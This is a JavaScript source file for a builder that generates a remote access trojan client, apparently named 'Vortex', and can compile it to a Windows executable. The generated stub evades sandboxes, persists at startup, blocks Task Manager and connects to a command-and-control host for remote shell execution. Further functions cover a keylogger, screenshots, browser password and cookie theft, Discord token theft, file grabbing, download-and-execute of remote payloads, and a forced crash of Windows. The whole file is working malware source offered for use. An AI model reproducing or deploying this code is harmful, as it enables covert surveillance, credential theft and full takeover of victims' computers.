const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

class ClientBuilder {
  constructor(outputDir) {
    this.outputDir = outputDir || path.join(__dirname, 'builds');
    if (!fs.existsSync(this.outputDir)) {
      fs.mkdirSync(this.outputDir, { recursive: true });
    }
  }

  async build(config) {
    return new Promise(async (resolve, reject) => {
      try {
        const mutex = config.mutex || ('VortexMutex_' + crypto.randomBytes(4).toString('hex'));
        const ips = config.ips || ['127.0.0.1'];
        const ports = config.ports || [4444];
        const groupName = config.groupName || 'Default';
        const installPath = config.filePath || '%AppData%';
        const sleepTime = parseInt(config.sleep) || 1;
        const enableStartup = config.startup || false;
        const antiVM = config.antiVM || false;
        const blockTM = config.blockTM || false;
        const bsod = config.bsod || false;
        const ipByLink = config.ipByLink || false;
        const ipLink = config.ipLink || '';
        const buildExe = config.buildExe || false;
        const noConsole = config.noConsole || false;

        const stubCode = this._generateStub({
          ips,
          ports,
          groupName,
          mutex,
          installPath,
          sleepTime,
          enableStartup,
          antiVM,
          blockTM,
          bsod,
          ipByLink,
          ipLink,
          noConsole
        });

        const filenameJS = `client_${Date.now()}.js`;
        const outputPathJS = path.join(this.outputDir, filenameJS);

        fs.writeFileSync(outputPathJS, stubCode, 'utf8');

        if (buildExe) {
          const { exec } = require('child_process');
          const outputName = filenameJS.replace('.js', '.exe');
          const outputPathEXE = path.join(this.outputDir, outputName);
          
          const pkgCmd = `npx pkg "${outputPathJS}" --targets node18-win-x64 --output "${outputPathEXE}"`;
          
          exec(pkgCmd, (error, stdout, stderr) => {
            if (error) {
              console.error(`Pkg error: ${error}`);
              resolve({
                success: true,
                path: outputPathJS,
                filename: filenameJS,
                size: Buffer.byteLength(stubCode),
                warning: 'EXE build failed, JS file created. Error: ' + error.message
              });
            } else {
              try {
                const stats = fs.statSync(outputPathEXE);
                resolve({
                  success: true,
                  path: outputPathEXE,
                  filename: outputName,
                  size: stats.size
                });
              } catch (e) {
                reject(e);
              }
            }
          });
        } else {
          resolve({
            success: true,
            path: outputPathJS,
            filename: filenameJS,
            size: Buffer.byteLength(stubCode)
          });
        }
      } catch (err) {
        reject(err);
      }
    });
  }

  _generateStub(cfg) {
    const stub = `
${cfg.noConsole ? `
if (process.platform === 'win32' && !process.env.HIDDEN_RELAUNCH) {
  require('child_process').spawn(process.execPath, process.argv.slice(1), {
    detached: true, 
    windowsHide: true,
    env: { ...process.env, HIDDEN_RELAUNCH: '1' }
  }).unref();
  process.exit(0);
}
` : ''}
const net = require('net');
const os = require('os');
const { exec, spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const https = require('https');
const http = require('http');

const CONFIG = {
  hosts: ${JSON.stringify(cfg.ips)},
  ports: ${JSON.stringify(cfg.ports)},
  group: ${JSON.stringify(cfg.groupName)},
  mutex: ${JSON.stringify(cfg.mutex)},
  installPath: ${JSON.stringify(cfg.installPath)},
  sleepTime: ${cfg.sleepTime},
  startup: ${cfg.enableStartup},
  antiVM: ${cfg.antiVM},
  blockTM: ${cfg.blockTM},
  bsod: ${cfg.bsod},
  ipByLink: ${cfg.ipByLink},
  ipLink: ${JSON.stringify(cfg.ipLink)}
};

let socket = null;
let reconnectTimer = null;
let buffer = Buffer.alloc(0);
let keylogProcess = null;

function checkMutex() {
  const mutexPath = path.join(os.tmpdir(), CONFIG.mutex + '.lock');
  try {
    if (fs.existsSync(mutexPath)) {
      const pid = parseInt(fs.readFileSync(mutexPath, 'utf8'));
      try { 
        process.kill(pid, 0); 
        return false; 
      } catch(e) {}
    }
    fs.writeFileSync(mutexPath, process.pid.toString());
    process.on('exit', () => { try { fs.unlinkSync(mutexPath); } catch(e) {} });
    return true;
  } catch(e) { return true; }
}

function checkVM() {
  if (!CONFIG.antiVM) return false;
  try {
    const hostname = os.hostname().toLowerCase();
    const vmNames = ['sandbox', 'virus', 'malware', 'vmware', 'virtualbox', 'vbox', 'qemu', 'xen'];
    if (vmNames.some(n => hostname.includes(n))) return true;
    const cpus = os.cpus();
    if (cpus.length < 2) return true;
    const totalMem = os.totalmem();
    if (totalMem < 2 * 1024 * 1024 * 1024) return true;
    return false;
  } catch(e) { return false; }
}

function installStartup() {
  if (!CONFIG.startup) return;
  if (process.platform === 'win32') {
    try {
      const startupPath = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
      const targetFile = path.join(startupPath, 'WindowsService.js');
      if (!fs.existsSync(targetFile)) {
        if (process.pkg) {
           fs.copyFileSync(process.execPath, targetFile.replace('.js', '.exe'));
        } else {
           fs.copyFileSync(process.argv[1], targetFile);
        }
      }
    } catch(e) {}
  }
}

function blockTaskManager() {
  if (!CONFIG.blockTM || process.platform !== 'win32') return;
  setInterval(() => {
    try {
      exec('taskkill /F /IM taskmgr.exe', { windowsHide: true });
    } catch(e) {}
  }, 3000);
}

function getSystemInfo() {
  const interfaces = os.networkInterfaces();
  let localIp = '0.0.0.0';
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        localIp = iface.address;
        break;
      }
    }
  }

  return {
    hostname: os.hostname(),
    username: os.userInfo().username,
    os: os.type() + ' ' + os.release() + ' ' + os.arch(),
    platform: process.platform,
    cpus: os.cpus().length,
    totalMemory: Math.round(os.totalmem() / (1024 * 1024)),
    freeMemory: Math.round(os.freemem() / (1024 * 1024)),
    localIp: localIp,
    country: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
    group: CONFIG.group,
    pid: process.pid,
    uptime: os.uptime()
  };
}

function send(data) {
  if (!socket || socket.destroyed) return;
  try {
    const json = JSON.stringify(data);
    const msgBuf = Buffer.from(json, 'utf8');
    const lenBuf = Buffer.alloc(4);
    lenBuf.writeUInt32LE(msgBuf.length);
    socket.write(Buffer.concat([lenBuf, msgBuf]));
  } catch(e) {}
}

function handleCommand(cmd) {
  switch(cmd.type) {
    case 'get-info': send({ type: 'info', data: getSystemInfo() }); break;
    case 'ping': send({ type: 'pong', timestamp: cmd.timestamp }); break;
    case 'shell': 
      exec(cmd.command, { maxBuffer: 10 * 1024 * 1024, timeout: 30000, windowsHide: true }, (err, stdout, stderr) => {
        send({ type: 'shell-output', data: { output: stdout || '', error: stderr || err?.message || '' } });
      });
      break;
    case 'screenshot': takeScreenshot(); break;
    case 'file-list': listFiles(cmd.path); break;
    case 'file-download': downloadFile(cmd.path); break;
    case 'file-upload': uploadFile(cmd.path, cmd.data); break;
    case 'file-delete': deleteFile(cmd.path); break;
    case 'process-list': getProcessList(); break;
    case 'process-kill': killProcess(cmd.pid); break;
    case 'keylogger-start': startKeylogger(); break;
    case 'keylogger-stop': stopKeylogger(); break;
    case 'get-passwords': getPasswords(); break;
    case 'get-discord-tokens': getDiscordTokens(); break;
    case 'get-clipboard': getClipboard(); break;
    case 'set-clipboard': setClipboard(cmd.data); break;
    case 'messagebox': showMessageBox(cmd.title, cmd.text, cmd.icon); break;
    case 'open-url': openUrl(cmd.url); break;
    case 'shutdown': 
      if (process.platform === 'win32') exec('shutdown /s /t 0', { windowsHide: true });
      else exec('shutdown -h now');
      break;
    case 'restart': 
      if (process.platform === 'win32') exec('shutdown /r /t 0', { windowsHide: true });
      else exec('reboot'); 
      break;
    case 'logoff': if (process.platform === 'win32') exec('shutdown /l', { windowsHide: true }); break;
    case 'bsod': 
      if (process.platform === 'win32') exec('taskkill /F /IM csrss.exe', { windowsHide: true });
      break;
    case 'grab-files': grabFiles(cmd.extensions, cmd.directories, cmd.maxSize); break;
    case 'uninstall': uninstall(); break;
    case 'system-info-detail': getDetailedSystemInfo(); break;
    case 'run-file': exec(cmd.path, { windowsHide: true }); break;
    case 'download-execute': downloadAndExecute(cmd.url); break;
  }
}

function takeScreenshot() {
  if (process.platform === 'win32') {
    const tmpFile = path.join(os.tmpdir(), 'vortex_ss_' + Date.now() + '.png');
    const psScript = \`Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; \\$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \\$bmp = New-Object System.Drawing.Bitmap(\\$bounds.Width, \\$bounds.Height); \\$g = [System.Drawing.Graphics]::FromImage(\\$bmp); \\$g.CopyFromScreen(\\$bounds.Location, [System.Drawing.Point]::Empty, \\$bounds.Size); \\$bmp.Save('\${tmpFile}'); \\$g.Dispose(); \\$bmp.Dispose();\`;
    exec(\`powershell -WindowStyle Hidden -Command "\${psScript.replace(/"/g, '\"')}"\`, { windowsHide: true }, (err) => {
      if (!err && fs.existsSync(tmpFile)) {
        const data = fs.readFileSync(tmpFile).toString('base64');
        send({ type: 'screenshot', data: data });
        fs.unlinkSync(tmpFile);
      } else {
        send({ type: 'screenshot', data: null });
      }
    });
  } else { send({ type: 'screenshot', data: null }); }
}

function listFiles(dirPath) {
  try {
    dirPath = dirPath || (process.platform === 'win32' ? 'C:\\\\' : '/');
    const items = fs.readdirSync(dirPath);
    const files = [];
    for (const item of items) {
      try {
        const fullPath = path.join(dirPath, item);
        const stat = fs.statSync(fullPath);
        files.push({ name: item, path: fullPath, isDir: stat.isDirectory(), size: stat.size, modified: stat.mtime.toISOString() });
      } catch(e) {}
    }
    send({ type: 'file-list', data: { path: dirPath, files } });
  } catch(e) { send({ type: 'file-list', data: { path: dirPath, files: [], error: e.message } }); }
}

function downloadFile(filePath) {
  try {
    const data = fs.readFileSync(filePath).toString('base64');
    const name = path.basename(filePath);
    send({ type: 'file-data', data: { name, path: filePath, content: data, size: Buffer.from(data, 'base64').length } });
  } catch(e) { send({ type: 'file-data', data: { error: e.message } }); }
}

function uploadFile(filePath, base64Data) {
  try {
    fs.writeFileSync(filePath, Buffer.from(base64Data, 'base64'));
    send({ type: 'file-upload-result', data: { success: true, path: filePath } });
  } catch(e) { send({ type: 'file-upload-result', data: { success: false, error: e.message } }); }
}

function deleteFile(filePath) {
  try {
    const stat = fs.statSync(filePath);
    if (stat.isDirectory()) fs.rmdirSync(filePath, { recursive: true });
    else fs.unlinkSync(filePath);
    send({ type: 'file-upload-result', data: { success: true, path: filePath, deleted: true } });
  } catch(e) { send({ type: 'file-upload-result', data: { success: false, error: e.message } }); }
}

function getProcessList() {
  if (process.platform === 'win32') {
    exec('tasklist /FO CSV /NH', { maxBuffer: 5 * 1024 * 1024, windowsHide: true }, (err, stdout) => {
      if (err) { send({ type: 'process-list', data: [] }); return; }
      const procs = [];
      const lines = stdout.trim().split('\\n');
      for (const line of lines) {
        const parts = line.split('","');
        if (parts.length >= 5) {
          procs.push({ name: parts[0].replace(/"/g, ''), pid: parseInt(parts[1].replace(/"/g, '')), memory: parts[4].replace(/"/g, '').trim() });
        }
      }
      send({ type: 'process-list', data: procs });
    });
  } else {
    send({ type: 'process-list', data: [] });
  }
}

function killProcess(pid) {
  if (process.platform === 'win32') {
    exec(\`taskkill /F /PID \${pid}\`, { windowsHide: true }, (err) => {
      send({ type: 'process-kill-result', data: { pid, success: !err, error: err?.message } });
    });
  }
}

function startKeylogger() {
  if (keylogProcess) return;
  if (process.platform === 'win32') {
    const script = \`
\\$code = @'
using System; using System.Runtime.InteropServices; using System.Diagnostics;
using System.Windows.Forms;
namespace Keylogger {
  public class Program {
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
    
    private const int WH_KEYBOARD_LL = 13; private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback; private static IntPtr _hookID = IntPtr.Zero;
    
    public static void Main() { _hookID = SetHook(_proc); Application.Run(); UnhookWindowsHookEx(_hookID); }
    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
      using (Process curProcess = Process.GetCurrentProcess())
      using (ProcessModule curModule = curProcess.MainModule) {
        return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
      }
    }
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
        int vkCode = Marshal.ReadInt32(lParam);
        Console.WriteLine((Keys)vkCode);
      }
      return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
  }
}
'@;
Add-Type -TypeDefinition \\$code -ReferencedAssemblies System.Windows.Forms, System.Drawing
[Keylogger.Program]::Main();
\`;
    const tmp = path.join(os.tmpdir(), 'vortex_kl.ps1');
    fs.writeFileSync(tmp, script);
    keylogProcess = spawn('powershell', ['-WindowStyle', 'Hidden', '-File', tmp], { windowsHide: true });
    keylogProcess.stdout.on('data', (data) => {
      send({ type: 'keylogger-data', data: data.toString() });
    });
    keylogProcess.on('exit', () => {
      try { if (fs.existsSync(tmp)) fs.unlinkSync(tmp); } catch(e) {}
      keylogProcess = null;
    });
  }
}

function stopKeylogger() {
  if (keylogProcess) {
    keylogProcess.kill();
    keylogProcess = null;
  }
}

function getPasswords() {
  if (process.platform === 'win32') {
    const script = \`
\\$browsers = @(
    @{ name = 'Chrome'; path = "\\$env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data" },
    @{ name = 'Edge'; path = "\\$env:LOCALAPPDATA\\\\Microsoft\\\\Edge\\\\User Data" },
    @{ name = 'Brave'; path = "\\$env:LOCALAPPDATA\\\\BraveSoftware\\\\Brave-Browser\\\\User Data" }
)
\\$results = @()
foreach (\\$b in \\$browsers) {
    if (Test-Path \\$b.path) {
        \\$localState = Join-Path \\$b.path "Local State"
        if (Test-Path \\$localState) {
            \\$key = (Get-Content \\$localState -Raw | ConvertFrom-Json).os_crypt.encrypted_key
            \\$profiles = Get-ChildItem \\$b.path -Directory -Filter "Profile *" | Select-Object -ExpandProperty Name
            \\$profiles += "Default"
            foreach (\\$p in \\$profiles) {
                \\$loginData = Join-Path \\$b.path \\$p "Login Data"
                \\$cookies = Join-Path \\$b.path \\$p "Network\\\\Cookies"
                if (Test-Path \\$loginData) {
                    \\$tmpLogin = Join-Path \\$env:TEMP ("log_" + (Get-Date -Format "yyyyMMddHHmmss") + "_" + [Guid]::NewGuid().ToString().Substring(0,8))
                    Copy-Item \\$loginData \\$tmpLogin
                    \\$loginBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes(\\$tmpLogin))
                    Remove-Item \\$tmpLogin
                    
                    \\$cookieBase64 = ""
                    if (Test-Path \\$cookies) {
                        \\$tmpCookie = Join-Path \\$env:TEMP ("coo_" + (Get-Date -Format "yyyyMMddHHmmss") + "_" + [Guid]::NewGuid().ToString().Substring(0,8))
                        Copy-Item \\$cookies \\$tmpCookie
                        \\$cookieBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes(\\$tmpCookie))
                        Remove-Item \\$tmpCookie
                    }

                    \\$results += @{ browser = \\$b.name; profile = \\$p; key = \\$key; loginData = \\$loginBase64; cookies = \\$cookieBase64 }
                }
            }
        }
    }
}
Write-Output (\\$results | ConvertTo-Json -Compress)
\`;
    exec(\`powershell -WindowStyle Hidden -Command "\${script.replace(/"/g, '\"')}"\`, { maxBuffer: 50 * 1024 * 1024, windowsHide: true }, (err, stdout) => {
      if (!err && stdout) {
        try {
          const data = JSON.parse(stdout);
          send({ type: 'browser-data', data: Array.isArray(data) ? data : [data] });
        } catch(e) {}
      }
    });
  }
}

function getDiscordTokens() {
  const paths = [
    path.join(process.env.APPDATA, 'discord', 'Local Storage', 'leveldb'),
    path.join(process.env.APPDATA, 'discordcanary', 'Local Storage', 'leveldb'),
    path.join(process.env.APPDATA, 'discordptb', 'Local Storage', 'leveldb'),
    path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
    path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
    path.join(process.env.APPDATA, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb')
  ];
  const tokens = [];
  paths.forEach(p => {
    if (fs.existsSync(p)) {
      try {
        fs.readdirSync(p).forEach(file => {
          if (file.endsWith('.log') || file.endsWith('.ldb')) {
            const content = fs.readFileSync(path.join(p, file), 'utf8');
            const regexes = [/[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}/, /mfa\\.[\\w-]{84}/];
            regexes.forEach(regex => {
              const matches = content.match(new RegExp(regex, 'g'));
              if (matches) matches.forEach(t => { if (!tokens.some(x => x.token === t)) tokens.push({ app: path.basename(path.dirname(path.dirname(p))), token: t }); });
            });
          }
        });
      } catch(e) {}
    }
  });
  send({ type: 'discord-tokens', data: tokens });
}

function getClipboard() { send({ type: 'clipboard', data: execSync('powershell Get-Clipboard', { windowsHide: true }).toString().trim() }); }
function setClipboard(text) { exec(\`powershell Set-Clipboard -Value "\${text}"\`, { windowsHide: true }); }
function showMessageBox(title, text, icon) {
  const icons = { info: 64, warning: 48, error: 16, question: 32 };
  const code = \`Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("\${text}", "\${title}", [System.Windows.Forms.MessageBoxButtons]::OK, \${icons[icon] || 64});\`;
  exec(\`powershell -WindowStyle Hidden -Command "\${code}"\`, { windowsHide: true });
}
function openUrl(url) { exec(\`explorer "\${url}"\`, { windowsHide: true }); }

function getDetailedSystemInfo() {
  const info = getSystemInfo();
  info.uptime = os.uptime();
  info.nodeVersion = process.version;
  info.homeDir = os.homedir();
  info.tmpDir = os.tmpdir();
  send({ type: 'system-info-detail', data: info });
}

function grabFiles(extensions, directories, maxSize) {
  const exts = extensions.split(',').map(e => e.trim().toLowerCase());
  const maxBytes = (maxSize || 10) * 1024 * 1024;
  const foundFiles = [];
  const searchDirs = directories.map(d => {
    switch(d) {
      case 'Desktop': return path.join(os.homedir(), 'Desktop');
      case 'Documents': return path.join(os.homedir(), 'Documents');
      case 'Downloads': return path.join(os.homedir(), 'Downloads');
      case 'Pictures': return path.join(os.homedir(), 'Pictures');
      default: return null;
    }
  }).filter(d => d && fs.existsSync(d));

  searchDirs.forEach(dir => {
    try {
      const walk = (d) => {
        fs.readdirSync(d).forEach(f => {
          const fp = path.join(d, f);
          try {
            const s = fs.statSync(fp);
            if (s.isDirectory()) walk(fp);
            else if (exts.some(e => f.toLowerCase().endsWith(e)) && s.size <= maxBytes) {
              foundFiles.push({ name: f, path: fp, size: s.size });
            }
          } catch(e) {}
        });
      };
      walk(dir);
    } catch(e) {}
  });
  send({ type: 'grabbed-files', data: foundFiles });
}

function downloadAndExecute(url) {
  const dest = path.join(os.tmpdir(), 'vortex_dl_' + Date.now() + '.exe');
  const file = fs.createWriteStream(dest);
  const protocol = url.startsWith('https') ? https : http;
  protocol.get(url, (res) => {
    res.pipe(file);
    file.on('finish', () => {
      file.close();
      exec(dest, { windowsHide: true });
    });
  }).on('error', (err) => {
    try { fs.unlinkSync(dest); } catch(e) {}
  });
}

function uninstall() {
  const mutexPath = path.join(os.tmpdir(), CONFIG.mutex + '.lock');
  if (fs.existsSync(mutexPath)) fs.unlinkSync(mutexPath);
  process.exit(0);
}

function connect() {
  let hostIdx = 0;
  let portIdx = 0;

  function tryConnect() {
    if (socket) socket.destroy();
    const host = CONFIG.hosts[hostIdx];
    const port = CONFIG.ports[portIdx];
    
    socket = new net.Socket();
    socket.setTimeout(10000);
    
    socket.connect(port, host, () => {
      socket.setTimeout(0);
    });

    socket.on('data', (data) => {
      buffer = Buffer.concat([buffer, data]);
      while (buffer.length >= 4) {
        const msgLen = buffer.readUInt32LE(0);
        if (buffer.length < 4 + msgLen) break;
        const msgData = buffer.slice(4, 4 + msgLen);
        buffer = buffer.slice(4 + msgLen);
        try { handleCommand(JSON.parse(msgData.toString('utf8'))); } catch(e) {}
      }
    });

    socket.on('close', () => {
      portIdx = (portIdx + 1) % CONFIG.ports.length;
      if (portIdx === 0) hostIdx = (hostIdx + 1) % CONFIG.hosts.length;
      reconnectTimer = setTimeout(tryConnect, CONFIG.sleepTime * 1000);
    });

    socket.on('error', () => {
      socket.destroy();
    });

    socket.on('timeout', () => {
      socket.destroy();
    });
  }
  tryConnect();
}

if (!checkMutex() || checkVM()) process.exit(0);
installStartup();
blockTaskManager();
connect();
`;
    return stub.trim();
  }
}

module.exports = ClientBuilder;
